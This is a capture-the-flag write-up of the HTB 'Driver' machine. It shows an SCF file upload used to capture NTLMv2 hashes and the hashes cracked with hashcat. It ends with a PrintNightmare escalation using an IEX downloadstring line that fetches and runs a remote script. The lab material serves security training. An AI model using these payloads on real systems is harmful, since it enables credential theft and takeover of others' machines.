---
title: "Driver - Easy"
date: 2021-12-26T06:08:28-08:00
---
### Tools Used
- Nmap
- Hashcat
- Responder 
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Print Nightmare](https://github.com/calebstewart/CVE-2021-1675)
---
# Foothold
### Enumeration
```

# Nmap 7.92 scan initiated Sun Dec 26 01:20:04 2021 as: nmap -sS -A -sC -sV -v -p- --min-rate 5000 -oN nmapresult.txt 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.062s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (90%)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-26T13:22:08
|_  start_date: 2021-12-26T13:20:03
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 7h01m20s, deviation: 0s, median: 7h01m20s

# Nmap done at Sun Dec 26 01:21:24 2021 -- 1 IP address (1 host up) scanned in 79.99 seconds

```
When accessing the webpage, a typical admin login window appears. Entering "admin" for the username and password grants the attacker access to the webpage shows a "MFP Firmware Update Center" page. The 2 accessible pages are the landing page and a firmware update page. Viewing the Firmware Update Page shows a dropdown to select a printer model and an option to upload a firmware file. The firmware file however does not need to meet any requirements therefore any file can uploaded onto the host.
### Grabbing the User Hash with a Shell Command File attack
Using the file upload system, we can create a file that attempts to connect to a shared network that does not exist. While the host attempts to connect to it, the device shares it client, username and password hash

![NTLM replay attack| 800](https://miro.medium.com/max/1400/1*P_fB9CnsEhWdLqZ3FQyWTA.png)
To force the host to search for a invalid network share, a Shell Command File attack is used. Making a file with the extension of .sfc with the following commands makes the machine attempt to find a desktop icon on a shared drive that doesn't exist:
```

[Shell]
Command=2
IconFile=\\0.0.0.0\share\test.ico
[Taskbar]
Command=ToggleDesktop

```
Placing a NTLMv1 and NTLMv2 relayer, retrieves the following result on a terminal:
```

[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:9b3f8d8ee7c6fded:3A2225F8351F18ACC3AFD18AD508D506:010100000000000000D375C455FBD701CA0CB377746A238000000000020000000000000000000000                                                                   
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:0a20e715a794923d:16966757E2F47AC7856F34BDDE220010:0101000000000000CAF99BC455FBD7012DD94D617599B7C000000000020000000000000000000000                                                                   
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:6a6048ad279deb14:9323B43336D05A6A194265D6E50EEE5F:0101000000000000F746C9C455FBD701BC23FD1C08D56DFD00000000020000000000000000000000                                                                   
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:1bee18ac9be63ca4:16A971732D68094D5F50A2FBD08DCBF6:01010000000000007ECDF1C455FBD701ED24F23F044BB6F400000000020000000000000000000000                                                                   
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:a924e81855a1be76:E5E9AA6CA1BD5EDD893E9036B283A265:0101000000000000F1B71CC555FBD7017CE0EA88A2451A0800000000020000000000000000000000                                                                   
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c4e9b0bbaa1d974b:8454739B10124667AE90873D389BD6B6:01010000000000009A4045C555FBD701AAA3B0DD29393F7F00000000020000000000000000000000                                                                   
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:ab7a6255e7a0c069:26D9CC2D4E1F695CD908742C23EDDFA8:0101000000000000F55277C555FBD701C0BF682BD61B91FE00000000020000000000000000000000    

```
### Hashcat Result 
```

TONY::DRIVER:ab7a6255e7a0c069:26d9cc2d4e1f695cd908742c23eddfa8:0101000000000000f55277c555fbd701c0bf682bd61b91fe00000000020000000000000000000000:liltony
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:ab7a6255e7a0c069:26d9cc2d4e1f695cd9087...000000
Time.Started.....: Mon Dec 27 07:22:29 2021 (0 secs)
Time.Estimated...: Mon Dec 27 07:22:29 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   423.5 kH/s (1.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 36864/14344385 (0.26%)
Rejected.........: 0/36864 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: !!!!!! -> holaz

```
Using the decrypted password, the credentials can be entered into evil-winrm in order to login as tony and retrieve user.txt off the desktop 

---
# Privilege  Escalation 
Once a foothold is retrieved, an exploit called [Print Nightmare](https://github.com/calebstewart/CVE-2021-1675) is used to create an admin user to retrieve root.txt. Due to the Execution Policy on the machine being restricted (shown by entering `Get-ExecutionPolicy`), an alternative way of executing the exploit must be used. While not being able to execute PowerShell files, the Invoke-Expression (IEX) allows a webclient to be run and then download the contents of a file and save it into memory 
`IEX(New-Object Net.Webclient).downloadstring('http://0.0.0.0/CVE-2021-1675.ps1')`
By abusing a logic flaw regarding adding printer drivers, a new user assigned to an administrator group can be created.
Once the account is created, the account can be logged into using Evil-RM and root.txt can be retrieved.
